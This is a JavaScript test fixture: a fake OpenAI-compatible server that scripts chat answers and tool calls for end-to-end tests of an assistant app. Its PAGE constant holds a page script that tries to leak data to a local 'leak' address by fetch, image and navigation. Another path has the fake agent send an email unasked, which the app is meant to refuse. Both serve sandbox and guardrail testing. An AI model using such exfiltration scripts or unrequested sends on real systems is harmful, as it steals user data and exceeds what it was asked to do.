// A deterministic OpenAI-compatible brain for local end-to-end checks.
// Usage: node test/fixtures/fake-brain.js   (then connect "Other" → http://127.0.0.1:4174/v1)
// Streams a short thought and a Markdown answer, in the language the prompt asks for.
// Answers from shared documents when there are some, citing them as [n], and imitates a
// provider's prefix cache: usage reports how much of each request repeats the previous one.
// With a shared table of data it works like a real brain would in 0.3: it offers
// Calculations if they're off, then runs a script that reads the file and totals it.
// From 0.4 it remembers what follows "Remember", says what its <memory> holds when asked
// "What do you know?", and saves a skill when asked to (finding the tool first if needed).
// From 0.5 it searches the web when asked to, reads the user's latest emails through a
// connection (finding its tool first, or from a script when Calculations are on) and sums them
// up citing each one, and draws with models.image; /images/generations answers with a picture.
// From 0.6 it splits a "briefing" between two helpers (each finds the mail tool, asks first, and
// reports one email), answers Double-check's requests by comparing words, and gives a brief of
// what's new when told the user is back. It sees pictures (a capture of the screen): it says how
// big the last one is, read from its PNG header. It titles conversations with their first longer words.
// It writes a "Word document" when asked for one, adds a step to it when asked to, and makes a
// spreadsheet of a shared table's totals from a script (D119). Asked for a "web page", it writes one
// whose script would send what it holds away, as an injected page would (D126), and an "SVG logo" as a drawing.
// From 0.7 it makes a routine when asked for something "every" day or for a routine, at the time
// asked, or else at the time Jean says requests of the kind were made.
// For the browser (D140) it serves a bakery's site, whose page links to its menu, and a page that
// refuses to be framed; asked for "the bakery site", it opens it (offering the browser first if
// it's off) and answers from the page; asked to "give me a link", it answers with one.
// Asked for a letter, it first asks three questions at once (D146): the tone, recommending one,
// what the letter asks for, several at once, and who signs it; then it says what it was told.
// Told "I'm Marie" (or "je m'appelle Marie"), it saves the name while it may (D150).
// In a conversation opened on a folder (D141), it finds which files mention something, lists the
// folder, and changes a file when asked to change "this" to "that" in it: it opens the file first,
// then changes it, and asks again when told the folder is open now. Asked to make a page "saying"
// something, it makes it there, as a heading (D156).
import { createServer } from 'node:http'
import { deflateSync, crc32 } from 'node:zlib'

/** The savings plan, worked out month by month and drawn as a page of bars (D163). */
const SAVINGS = `const rate = 0.04 / 12
let balance = 0
const years = []
for (let month = 1; month <= 120; month++) {
  balance = balance * (1 + rate) + 200
  if (month % 12 === 0) years.push(Math.round(balance))
}
const total = years[years.length - 1]
const bars = years.map((value, i) => '<rect x="' + (40 + i * 50) + '" y="' + (220 - (value / total) * 200) + '" width="36" height="' + ((value / total) * 200) + '" fill="#c8691c"></rect>').join('')
await fs.writeFile('Savings plan.html', '<!doctype html><title>Savings plan</title><h1>Savings plan</h1><svg viewBox="0 0 560 240" width="560">' + bars + '</svg><p id="total">After 10 years: ' + total + '</p>')
return { years, total }`

const PORT = Number(process.env.PORT) || 4174
let previous = ''
const BAKERY = `http://127.0.0.1:${PORT}/site/bakery.html`
/** @type {Record<string, { body: string, headers?: Record<string, string> }>} */
const SITE = {
  '/site/bakery.html': { body: '<!doctype html><title>The bakery</title><h1>The bakery</h1><p>Fresh bread every morning, from 7 am.</p><p><a href="menu.html">Menu</a></p>' },
  '/site/menu.html': { body: '<!doctype html><title>Menu</title><h1>Menu</h1><p>Croissants and baguettes.</p>' },
  '/site/refuses.html': { body: '<!doctype html><title>Refuses</title><h1>Never in a frame</h1>', headers: { 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "frame-ancestors 'none'" } },
}

/** @param {string} a @param {string} b */
function sharedPrefix(a, b) {
  let i = 0
  while (i < a.length && i < b.length && a[i] === b[i]) i++
  return i
}

const REPLIES = {
  en: (/** @type {string} */ question) => `## Here is what I found\n\nYou asked: *${question}*\n\n- First, I read your request.\n- Then, I worked it out **carefully**.\n\n| Step | Status |\n|---|---|\n| Read | done |\n| Answer | done |\n\nAnything else?`,
  fr: (/** @type {string} */ question) => `## Voici ce que j’ai trouvé\n\nVous avez demandé : *${question}*\n\n- D’abord, j’ai lu votre demande.\n- Ensuite, j’ai réfléchi **avec soin**.\n\nAutre chose ?`,
  ar: (/** @type {string} */ question) => `## إليك ما وجدته\n\nسألتَ: *${question}*\n\n- أولًا، قرأتُ طلبك.\n- ثم فكّرتُ **بعناية**.\n\nهل من شيء آخر؟`,
  ja: (/** @type {string} */ question) => `## わかったこと\n\nご質問：*${question}*\n\n- まず、ご依頼を読みました。\n- 次に、**丁寧に**考えました。\n\n他にありますか？`,
}
const TOTALS = {
  en: (/** @type {string} */ of, /** @type {string} */ by) => `Here are the exact totals of **${of}** by **${by}**`,
  fr: (/** @type {string} */ of, /** @type {string} */ by) => `Voici les totaux exacts de **${of}** par **${by}**`,
  ar: (/** @type {string} */ of, /** @type {string} */ by) => `إليك المجاميع الدقيقة لـ **${of}** حسب **${by}**`,
  ja: (/** @type {string} */ of, /** @type {string} */ by) => `**${by}**ごとの**${of}**の正確な合計です`,
}
const SUGGESTIONS = {
  en: ['Show it as a chart', 'Which one grew most?', 'Write a short summary'],
  fr: ['Montre-le en graphique', 'Lequel a le plus progressé ?', 'Écris un court résumé'],
  ar: ['اعرضه كرسم بياني', 'أيّها نما أكثر؟', 'اكتب ملخصًا قصيرًا'],
  ja: ['グラフで見せて', '一番伸びたのはどれ？', '短い要約を書いて'],
}

/** What a letter needs (D146). */
const LETTER = [
  { question: 'Which tone should the letter have?', options: [{ label: 'Formal', description: 'For a bank or an office', recommended: true }, { label: 'Friendly' }] },
  { question: 'What should it ask for?', options: [{ label: 'A meeting' }, { label: 'A refund' }, { label: 'More time' }], multiple: true },
  { question: 'Who signs it?' },
]

/** What the user answered, question by question. @param {string} content the tool's result */
function told(content) {
  if (/did not answer/.test(content)) return 'Nobody answered, so I wrote a formal letter.'
  const { answers } = JSON.parse(content)
  return `Here is your letter, as you asked:\n\n${answers.map((/** @type {any} */ a) => `- ${a.question} ${a.skipped ? 'You skipped it.' : [a.chose ?? []].flat().concat(a.wrote ?? []).join(', ')}`).join('\n')}`
}

/** A script that totals the first number column by the first text column. @param {string} name */
const totalsScript = (name) => `const rows = csv(await file(${JSON.stringify(name)}))
const keys = Object.keys(rows[0])
const by = keys.find((key) => typeof rows[0][key] === 'string')
const of = keys.find((key) => typeof rows[0][key] === 'number')
const totals = {}
for (const row of rows) totals[row[by]] = (totals[row[by]] ?? 0) + row[of]
console.log(rows.length + ' rows')
return { by, of, totals }`

/** The same totals, also written as a spreadsheet from the script (codemode, D119). @param {string} name */
const spreadsheetScript = (name) => totalsScript(name).replace('return { by, of, totals }',
  "await tools.write({ name: 'Totals.xlsx', content: [[by, of], ...Object.entries(totals)].map((row) => row.join(',')).join('\\n') })\nreturn { by, of, totals }")
/** Formulas in LaTeX, in a line, set apart and in a table, beside prices (D185). */
const GOLDEN = 'The ratio tends to $\\varphi \\approx 1.618$:\n\n$$\\varphi = \\frac{1 + \\sqrt{5}}{2}$$\n\n| Terms | Ratio |\n|---|---|\n| $F_5 / F_4$ | 1.6667 |\n\nA book costs $5 and a pen $10.'
/** A LaTeX document in a code block: sections, formulas set apart and in a line (D185). */
const EULER = "Voici :\n\n```latex\n\\section*{Formules d'Euler}\n\\subsection*{Identité d'Euler}\n\\[ e^{i\\pi} + 1 = 0 \\]\nPour un cube : $8 - 12 + 6 = 2$.\n```"
const PLAN = '# Bakery plan\n\n1. Bake 120 croissants\n2. Deliver them\n\n| Day | Croissants |\n|---|---:|\n| Saturday | 120 |'
/** A page with a style, and a script that tries every way out with what it holds: none may reach the leak address. It can fill the screen and save its prices, by a link or from its code (D158). */
const PAGE = `<!doctype html><title>Bakery</title><style>h1 { color: rgb(180, 70, 20) }</style><h1>Bakery</h1><p id="out">Waiting</p>
<a id="away" href="http://127.0.0.1:4182/leak?link">Away</a> <button id="go">Go</button>
<button id="big">Big</button> <a id="keep" download="Prices.csv" href="data:text/csv,Croissant%2C2">Keep</a> <button id="export">Export</button>
<script>document.getElementById('out').textContent = 'Baked by a script ' + document.compatMode
const leak = 'http://127.0.0.1:4182/leak?'
fetch(leak + 'fetch').catch(() => {})
new Image().src = leak + 'image'
document.getElementById('go').onclick = () => { location.href = leak + 'navigate' }
const out = (text) => { document.getElementById('out').textContent = text }
document.getElementById('big').onclick = () => document.body.requestFullscreen().then(() => document.exitFullscreen()).then(() => out('Full screen'), (error) => out(error.name))
document.getElementById('export').onclick = () => {
  const link = Object.assign(document.createElement('a'), { href: URL.createObjectURL(new Blob(['{"croissant":2}'])), download: 'Prices.json' })
  link.click()
  URL.revokeObjectURL(link.href)
}</script>`

/** A small PNG: a warm gradient. */
function picture(width = 96, height = 64) {
  const rows = Buffer.concat(Array.from({ length: height }, (_, y) => Buffer.from([0, ...Array.from({ length: width }, (_, x) => [200 - y, 110 + x, 70]).flat()])))
  const chunk = (/** @type {string} */ type, /** @type {Buffer} */ data) => {
    const body = Buffer.concat([Buffer.from(type), data])
    return Buffer.concat([Buffer.from(new Uint32Array([data.length]).buffer).reverse(), body, Buffer.from(new Uint32Array([crc32(body)]).buffer).reverse()])
  }
  const header = Buffer.from([0, 0, 0, width, 0, 0, 0, height, 8, 2, 0, 0, 0])
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', header), chunk('IDAT', deflateSync(rows)), chunk('IEND', Buffer.alloc(0))]).toString('base64')
}

/**
 * Double-check's verdicts: a claim is supported when most of its longer words are in its sources.
 * @param {string} text "Claim 1: …\nSource [n]: …" blocks
 */
function checked(text) {
  const words = (/** @type {string} */ part) => part.toLowerCase().match(/[\p{L}\p{N}]{4,}/gu) ?? []
  return text.split(/\n\n(?=Claim \d+:)/).map((block, i) => {
    const [claim, ...sources] = block.split('\n')
    const said = new Set(words(sources.join(' ')))
    const own = words(claim.replace(/^Claim \d+:/, ''))
    return `${i + 1}: ${own.filter((word) => said.has(word)).length >= own.length * 0.6 ? 'supported' : 'missing'}`
  }).join('\n')
}

/** Sources a tool's result lists: `Source [n]: title (address)` and what follows. @param {string} text */
const sourcesIn = (text) => [...text.matchAll(/Source \[(\d+)\]: (.+?) \(([^)]+)\)\n?([^\n]*)/g)].map((m) => ({ n: m[1], title: m[2], url: m[3], more: m[4] }))

createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Headers', '*')
  if (req.method === 'OPTIONS') return res.end()
  if (req.url?.endsWith('/models')) {
    res.setHeader('Content-Type', 'application/json')
    return res.end(JSON.stringify({ data: [{ id: 'fake-brain-1' }, { id: 'fake-brain-2' }, { id: 'fake-image-1' }] }))
  }
  if (req.url?.endsWith('/images/generations')) {
    res.setHeader('Content-Type', 'application/json')
    return res.end(JSON.stringify({ data: [{ b64_json: picture() }] }))
  }
  const page = SITE[req.url?.split('?')[0] ?? '']
  if (page) return res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', ...page.headers }).end(page.body)
  if (!req.url?.endsWith('/chat/completions')) return res.writeHead(404).end()

  let body = ''
  for await (const chunk of req) body += chunk
  const { messages, tools = [] } = JSON.parse(body)
  // A conversation's title, asked beside the answer: its first three longer words.
  if (messages[0]?.role === 'system' && messages[0].content.startsWith('Write a title')) {
    const title = (messages.at(-1).content.match(/[\p{L}\p{N}]{5,}/gu) ?? []).slice(0, 3).join(' ')
    res.writeHead(200, { 'Content-Type': 'text/event-stream' })
    res.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta: { content: `"${title}."` }, finish_reason: 'stop' }] })}\n\n`)
    return res.end('data: [DONE]\n\n')
  }
  const serialized = JSON.stringify(messages)
  const cached = sharedPrefix(previous, serialized)
  previous = serialized
  // A message with pictures is a list of parts: the text is read as one, the pictures apart.
  /** @type {string[]} */
  const pictures = []
  for (const message of messages) {
    if (!Array.isArray(message.content)) continue
    pictures.push(...message.content.flatMap((/** @type {any} */ part) => (part.type === 'image_url' ? [part.image_url.url] : [])))
    message.content = message.content.flatMap((/** @type {any} */ part) => (part.type === 'text' ? [part.text] : [])).join('\n\n')
  }
  const png = Buffer.from(pictures.at(-1)?.replace(/^data:image\/png;base64,/, '') ?? '', 'base64')
  const declared = new Set(tools.map((/** @type {any} */ tool) => tool.function.name))
  const lastUser = [...messages].reverse().find((message) => message.role === 'user')?.content ?? ''
  const last = messages.at(-1)
  const documents = [...messages.map((m) => m.content).join('\n').matchAll(/<document(?: source="(\d+)")? name="([^"]*)">\n([\s\S]*?)\n<\/document>/g)]
  const table = documents.findLast((doc) => /\.(csv|tsv)$/i.test(doc[2]))
  const question = lastUser.replace(/<document[\s\S]*<\/document>\n\n/, '').replace(/<system-note>[\s\S]*?<\/system-note>\n\n/g, '')
  const system = messages.find((message) => message.role === 'system')?.content ?? ''
  const lang = /[؀-ۿ]/.test(question) ? 'ar' : /[぀-ヿ一-龯]/.test(question) ? 'ja' : /use French\./.test(system) || /now French/.test(serialized) || /[éèàçù]/.test(question) ? 'fr' : 'en'
  const cite = (/** @type {RegExpMatchArray | undefined} */ doc) => (doc?.[1] ? ` [${doc[1]}]` : '')

  /** @type {{ name: string, args: object } | null} */
  let call = null
  let answer = ''
  // What the brain was told it knows: the frozen <memory>, or the latest note about it.
  const memory = [system, ...messages.map((m) => (typeof m.content === 'string' ? m.content : ''))].flatMap((text) => [...text.matchAll(/<memory>\n([\s\S]*?)\n<\/memory>|The <memory> section is now:\n((?:- .*\n?)*)/g)]).map((m) => (m[1] ?? m[2]).trim()).at(-1) ?? ''
  // Chat Completions tool results carry the call's id, not the tool's name.
  const toolName = last.role === 'tool' ? messages.flatMap((m) => m.tool_calls ?? []).find((c) => c.id === last.tool_call_id)?.function?.name : undefined
  const remember = /^(?:remember|retiens|覚えて)[:：,]?\s*(.+)/i.exec(question.trim())
  const introduced = /^(?:i'm|i am|my name is|je m'appelle)\s+([\p{L}-]+)/iu.exec(question.trim())
  const skill = /\bskill\b/i.test(question) && last.role === 'user'
  // A connected mail service's tools, by name: declared, or listed in <connections>.
  const mailTool = [...declared].find((name) => name.endsWith('_search_emails')) ?? /\b(\w+_search_emails)\b/.exec(serialized)?.[1]
  const emails = /e-?mails?|inbox|courriels?/i.test(question) || /The user is back/.test(serialized)
  // A script, called by name even when the computer came on mid-conversation (D104).
  const script = 'javascript'
  const fromScript = (/** @type {string} */ name) => ({ name: script, args: { code: `return await tools.${name}({ limit: 3 })` } })
  // The savings starter (D163), in English.
  const savings = /saving 200 a month/i.test(question)
  // "$ ls": a command, on the computer (D162).
  const command = /^\$ ([\s\S]+)/.exec(question.trim())?.[1]
  const found = sourcesIn(last.role === 'tool' ? last.content : '')
  // 0.6: a helper's turn, the briefing it is part of, and Double-check's requests.
  const helper = system.startsWith('You are a helper of')
  const task = helper ? messages.find((m) => m.role === 'user')?.content ?? '' : ''
  const topic = /invoice/i.test(task) ? 'invoice' : 'croissant'
  // A party to plan: one helper needs the number of guests from the user.
  const party = /party/i.test(question) && !helper
  const briefing = /briefing/i.test(question) && !helper
  // A brief of what's new: it reads the emails, then tries to answer one, which must be refused.
  const back = /The user is back/.test(serialized)
  const sendTool = mailTool?.replace(/_search_emails$/, '_send_email')
  const searched = sourcesIn([...messages].reverse().find((m) => m.role === 'tool' && /^Source \[/m.test(m.content))?.content ?? '')
  const steps = '# Weekly sales summary\n\n1. Read the shared sales file.\n2. Total the sales by region.\n3. Answer with a short table.'
  // 0.7: a routine, at the time asked, or at the time of the habit Jean noticed.
  const regularly = (/^every\b/i.test(question.trim()) || /\broutine\b/i.test(question)) && last.role === 'user'
  const habit = /Requests like this one were made on \w{3} \w{3} \d\d \d{4} (\d\d:\d\d)/.exec(serialized)?.[1]
  const routine = { title: 'Weekly sales', request: 'Summarize the weekly sales by region', every: 'day', at: /\bat (\d\d:\d\d)/.exec(question)?.[1] ?? habit ?? '09:00' }
  // 0.8: a folder's files, by the names <folder> gives its tools (D104, D141).
  const folder = /The user's folder /.test(serialized)
  const mentions = /\bmention(?:s)?\s+(?:the\s+)?["“]?(.+?)["”]?(?:\s+clause)?\?*$/i.exec(question.trim())?.[1]
  const edit = /\bin\s+(\S+),\s*change\s+["“](.+?)["”]\s+to\s+["“](.+?)["”]/i.exec(question)
  const make = /\bmake\s+(\S+\.html?)\s+saying\s+["“](.+?)["”]/i.exec(question)
  // Read already in this conversation: it changes the file straight away, and reads it again if told it moved.
  const opened = (/** @type {string} */ path) => messages.some((m) => (m.tool_calls ?? []).some((/** @type {any} */ c) => c.function.name === 'open' && JSON.parse(c.function.arguments).path === path))
  if (system.startsWith('You check whether sources support claims')) answer = checked(lastUser)
  else if (folder && mentions && last.role === 'user') call = { name: 'find_in_files', args: { text: mentions } }
  else if (toolName === 'find_in_files') answer = /^Not found/.test(last.content) ? 'No file there mentions it.' : `These files mention it:\n\n${[...new Set([...last.content.matchAll(/^(.+?):(\d+): /gm)].map((m) => m[1]))].map((path) => `- **${path}**`).join('\n')}`
  else if (folder && /what is in the folder/i.test(question) && last.role === 'user') call = { name: 'list', args: {} }
  else if (toolName === 'list') answer = `The folder holds:\n\n${last.content.split('\n').map((line) => `- ${line}`).join('\n')}`
  else if (folder && make && last.role === 'user') call = { name: 'change', args: { path: make[1], old: '', new: `<h1>${make[2]}</h1>\n` } }
  else if (folder && edit && last.role === 'user') call = { name: opened(edit[1]) ? 'change' : 'open', args: opened(edit[1]) ? { path: edit[1], old: edit[2], new: edit[3] } : { path: edit[1] } }
  else if (edit && toolName === 'open' && !last.content.startsWith('Error')) call = { name: 'change', args: { path: edit[1], old: edit[2], new: edit[3] } }
  else if (edit && toolName === 'change' && /is open now/.test(last.content)) call = { name: 'change', args: { path: edit[1], old: edit[2], new: edit[3] } }
  else if (edit && toolName === 'change' && /changed since you read it/.test(last.content)) call = { name: 'open', args: { path: edit[1] } }
  else if (toolName === 'change' || (edit && toolName === 'open')) answer = /^(Changed|Made) /.test(last.content) ? `Done: ${last.content}` : `That didn't work: ${last.content}`
  else if (helper && /how many/i.test(task) && last.role === 'user') call = { name: 'ask_user', args: { questions: [{ question: 'How many people are coming?' }] } }
  else if (helper && toolName === 'ask_user') answer = /did not answer|"skipped"/.test(last.content) ? 'Nobody said; I assumed 10 people.' : `${JSON.parse(last.content).answers[0].wrote} people are coming.`
  else if (helper && last.role === 'user' && mailTool && declared.has(mailTool)) call = { name: mailTool, args: { query: topic, limit: 1 } }
  else if (helper && last.role === 'user') call = { name: 'find_tools', args: { query: 'search emails' } }
  else if (helper && toolName === 'find_tools' && mailTool) call = { name: mailTool, args: { query: topic, limit: 1 } }
  else if (helper && found.length) answer = topic === 'invoice' ? `Invoice 2041, for 912 euros, is due on Friday 4 October [${found[0].n}].` : `Margot asks to confirm an order of 120 croissants for Saturday morning [${found[0].n}].`
  else if (helper) answer = 'I could not find it.'
  else if (/\bletter\b/i.test(question) && last.role === 'user' && declared.has('ask_user')) call = { name: 'ask_user', args: { questions: LETTER } }
  else if (toolName === 'ask_user') answer = told(last.content)
  else if (briefing && last.role === 'user' && declared.has('delegate')) {
    call = { name: 'delegate', args: { parts: [
      { title: 'Bakery orders', task: 'Find the latest email about the croissant order and say what it asks.' },
      { title: 'Bills to pay', task: 'Find the latest email about an invoice and say what is due, and when.' },
    ] } }
  } else if (party && last.role === 'user' && declared.has('delegate')) {
    call = { name: 'delegate', args: { parts: [
      { title: 'Guests', task: 'Ask the user how many people are coming.' },
      { title: 'Bills to pay', task: 'Find the latest email about an invoice and say what is due, and when.' },
    ] } }
  } else if (toolName === 'delegate') {
    const reports = [...last.content.matchAll(/^Part \d+, [^:]*:\n(.+)$/gm)].map((m) => m[1])
    const first = /\[(\d+)\]/.exec(reports[0] ?? '')?.[1] ?? '1'
    answer = `Your Monday briefing:\n\n${reports.map((report) => `- ${report}`).join('\n')}\n- The bakery is closed on Monday [${first}].`
  } else if (back && last.role === 'user') call = { name: 'find_tools', args: { query: 'search or send emails' } }
  else if (back && toolName === 'find_tools') call = { name: String(mailTool), args: { limit: 3 } }
  else if (back && toolName === mailTool && sendTool && declared.has(sendTool)) call = { name: sendTool, args: { to: 'margot@bakery.example', body: 'Confirmed.' } }
  else if (back && toolName === sendTool) answer = `Your ${searched.length} latest emails:\n\n${searched.map((email) => `- **${email.title}** [${email.n}]`).join('\n')}`
  else if (emails && last.role === 'user' && mailTool && declared.has(mailTool)) call = { name: mailTool, args: { limit: 3 } }
  else if (emails && last.role === 'user' && mailTool && declared.has(script)) call = fromScript(mailTool)
  else if (emails && last.role === 'user' && declared.has('find_tools')) call = { name: 'find_tools', args: { query: 'search the latest emails' } }
  else if (toolName === 'find_tools' && mailTool && /_search_emails\(/.test(last.content)) call = /inside (?:javascript|run)/.test(last.content) ? fromScript(mailTool) : { name: mailTool, args: { limit: 3 } }
  else if (toolName === mailTool && last.content.startsWith('Error: ')) answer = `That didn't work: ${last.content.slice(7)}`
  else if (found.length && /^mail:/.test(found[0].url)) {
    answer = `Your ${found.length} latest emails:\n\n${found.map((email) => `- **${email.title}**, ${email.more.replace(/:.*$/, '')} [${email.n}]`).join('\n')}`
  } else if (/search the web|look up/i.test(question) && last.role === 'user' && declared.has('web_search')) call = { name: 'web_search', args: { query: question.replace(/.*(?:search the web for|look up)\s*/i, '').replace(/[?.!]$/, '') } }
  else if (toolName === 'web_search') answer = found.length ? `Here is what the web says:\n\n${found.map((page) => `- **${page.title}**: ${page.more.slice(0, 90)} [${page.n}]`).join('\n')}` : 'I found nothing on the web.'
  else if (/bakery site/i.test(question) && last.role === 'user' && declared.has('browse')) call = { name: 'browse', args: { url: BAKERY } }
  else if (/bakery site/i.test(question) && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'browser' } }
  else if (/bakery site/i.test(question) && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'browse', args: { url: BAKERY } }
  else if (toolName === 'browse') answer = found.length ? `The bakery’s page is open beside our conversation. ${/Fresh bread[^\n]*/.exec(last.content)?.[0]} [${found[0].n}]` : `That didn't work: ${last.content}`
  // The savings starter: one script works the plan out and draws its chart as a page, which opens beside the conversation (D163).
  // Asked for a change, it makes the page again: a second version, the first kept (D164).
  // Turned on mid-conversation, javascript is deferred: called by its name, it runs all the same (D104).
  else if (/bars blue/i.test(question) && last.role === 'user') call = { name: 'javascript', args: { code: SAVINGS.replace('#c8691c', '#2563eb') } }
  else if (/bars blue/i.test(question) && toolName === 'javascript') answer = 'Done: the bars are blue now. The first version is still under my first answer.'
  else if (savings && last.role === 'user' && declared.has('javascript')) call = { name: 'javascript', args: { code: SAVINGS } }
  else if (savings && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'computer' } }
  else if (savings && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'javascript', args: { code: SAVINGS } }
  else if (savings && toolName === 'javascript') answer = `After 10 years you would have ${/"total": (\d+)/.exec(last.content)?.[1] ?? '?'}. The chart is open beside our conversation.`
  else if (command && last.role === 'user' && declared.has('bash')) call = { name: 'bash', args: { command } }
  else if (command && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'computer' } }
  else if (command && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'bash', args: { command } }
  else if (toolName === 'bash') answer = `The computer says:\n\n\`\`\`\n${last.content}\n\`\`\``
  else if (/give me a link/i.test(question) && last.role === 'user') answer = `Here it is: [the bakery](${BAKERY}).`
  else if (/golden ratio/i.test(question) && last.role === 'user') answer = GOLDEN
  else if (/euler/i.test(question) && last.role === 'user') answer = EULER
  else if (/\b(draw|picture)\b/i.test(question) && last.role === 'user' && declared.has(script)) call = { name: script, args: { code: `return await models.image(${JSON.stringify(question)})` } }
  else if (toolName === 'javascript' && /"shown":\s*true/.test(last.content)) answer = 'Here is your picture.'
  else if (/word document/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Bakery plan.docx', content: PLAN } }
  else if (/web page/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Bakery.html', content: PAGE } }
  else if (/svg logo/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Logo.svg', content: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120"><rect width="120" height="120" fill="#f6e7cf"/><circle cx="60" cy="60" r="38" fill="#c8691c"/></svg>' } }
  else if (/add a step/i.test(question) && last.role === 'user' && declared.has('edit')) call = { name: 'edit', args: { file: 'Bakery plan.docx', old: '2. Deliver them', new: '2. Deliver them\n3. Sell the rest' } }
  else if (toolName === 'write' || toolName === 'edit') answer = /^(?:Saved|Changed) /.test(last.content) ? `Done: **${/^(?:Saved|Changed) (.+?)\. /.exec(last.content)?.[1]}** is under this answer.` : `That didn't work: ${last.content}`
  else if (introduced && last.role === 'user' && declared.has('save_name')) call = { name: 'save_name', args: { name: introduced[1] } }
  else if (toolName === 'save_name') answer = `Nice to meet you, ${introduced?.[1] ?? 'friend'}.`
  else if (remember && last.role === 'user' && declared.has('remember')) call = { name: 'remember', args: { text: remember[1], scope: system.includes('<project>') ? 'project' : 'person' } }
  else if (toolName === 'remember') answer = 'Noted.'
  else if (/what do you know/i.test(question) && last.role === 'user') answer = memory ? `I know this:\n\n${memory}` : 'Nothing yet.'
  else if (regularly && declared.has('schedule')) call = { name: 'schedule', args: routine }
  else if (regularly && declared.has('find_tools')) call = { name: 'find_tools', args: { query: 'make a routine on a schedule' } }
  else if (toolName === 'find_tools' && /schedule\(/.test(last.content)) call = { name: 'schedule', args: routine }
  else if (toolName === 'schedule') answer = 'Done: it is a routine now.'
  else if (skill && declared.has('save_skill')) call = { name: 'save_skill', args: { name: 'weekly-sales-summary', description: 'When the user asks for a summary of the weekly sales by region.', steps } }
  else if (skill && declared.has('find_tools')) call = { name: 'find_tools', args: { query: 'save a skill' } }
  else if (toolName === 'find_tools' && /save_skill\(/.test(last.content)) call = { name: 'save_skill', args: { name: 'weekly-sales-summary', description: 'When the user asks for a summary of the weekly sales by region.', steps } }
  else if (toolName === 'save_skill') answer = 'Done: it is a skill now.'
  else if (table && /spreadsheet/i.test(question) && last.role === 'user' && declared.has(script)) call = { name: script, args: { code: spreadsheetScript(table[2]) } }
  else if (table && last.role === 'user' && declared.has(script)) call = { name: script, args: { code: totalsScript(table[2]) } }
  else if (table && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'computer' } }
  else if (table && last.role === 'tool' && /It is on/.test(last.content)) call = { name: 'javascript', args: { code: totalsScript(table[2]) } }
  else if (last.role === 'tool' && /^Result: /.test(last.content)) {
    const { by, of, totals } = JSON.parse(last.content.slice(8).split('\n\nLog:')[0])
    const rows = Object.entries(totals).map(([key, value]) => `| ${key} | ${value} |`).join('\n')
    answer = `${TOTALS[lang](of, by)}${cite(table)}:\n\n| ${by} | ${of} |\n|---|---:|\n${rows}`
  } else if (png.length > 24 && last.role === 'user') answer = `I can see your picture: ${png.readUInt32BE(16)} × ${png.readUInt32BE(20)} pixels.`
  else if (documents.length) {
    const doc = documents.at(-1)
    answer = `I read **${doc?.[2]}**${cite(doc)}. It starts with: “${doc?.[3].replace(/\[\[page \d+\]\]\n/g, '').slice(0, 120).trim()}”\n\nYou asked: *${question.slice(0, 80)}*`
  } else answer = REPLIES[lang](question.slice(0, 80))
  if (answer) answer += `\n\n<suggestions>\n${SUGGESTIONS[lang].join('\n')}\n</suggestions>`

  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' })
  const send = (/** @type {object} */ delta, finish = null) =>
    res.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`)
  const pause = () => new Promise((resolve) => setTimeout(resolve, 35))
  for (const word of 'Reading the request and planning a clear answer.'.split(' ')) {
    send({ reasoning: word + ' ' })
    await pause()
  }
  if (call) {
    send({ tool_calls: [{ index: 0, id: `call_${Date.now()}`, type: 'function', function: { name: call.name, arguments: JSON.stringify(call.args) } }] })
    send({}, 'tool_calls')
  } else {
    for (const piece of answer.match(/.{1,6}/gs) ?? []) {
      send({ content: piece })
      await pause()
    }
    send({}, 'stop')
  }
  const prompt = Math.ceil(serialized.length / 4)
  res.write(`data: ${JSON.stringify({ choices: [], usage: { prompt_tokens: prompt, completion_tokens: Math.ceil(answer.length / 4), prompt_tokens_details: { cached_tokens: Math.floor(cached / 4) } } })}\n\n`)
  res.end('data: [DONE]\n\n')
}).listen(PORT, '127.0.0.1', () => console.log(`Fake brain on http://127.0.0.1:${PORT}/v1`))
